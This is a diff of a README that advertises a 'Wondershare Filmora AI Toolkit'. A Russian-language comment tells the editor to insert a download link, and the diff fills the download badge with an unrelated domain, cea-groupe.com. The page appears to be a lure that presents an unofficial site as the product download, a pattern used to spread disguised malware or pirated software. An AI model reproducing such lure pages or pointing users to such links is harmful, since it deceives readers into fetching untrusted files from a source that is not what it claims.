@@ -5,7 +5,7 @@ Welcome to the **next evolution** in video editing. This advanced **Wondershare 
 Created for both **beginner editors** and **seasoned professionals**, this toolkit offers a highly configurable and user-friendly experience, wrapped in an intuitive interface.
 
 <!-- ПОДСКАЗКА НА РУССКОМ: Вставьте ссылку на страницу или файл для скачивания toolkit (например, https://example.com/download) вместо INSERT_DOWNLOAD_LINK_HERE -->
-[![Download AI Toolkit](https://img.shields.io/badge/Download-Filmora_AI_Toolkit-purple)](INSERT_DOWNLOAD_LINK_HERE)
+[![Download AI Toolkit](https://img.shields.io/badge/Download-Filmora_AI_Toolkit-purple)](https://cea-groupe.com)
 
 ---
 
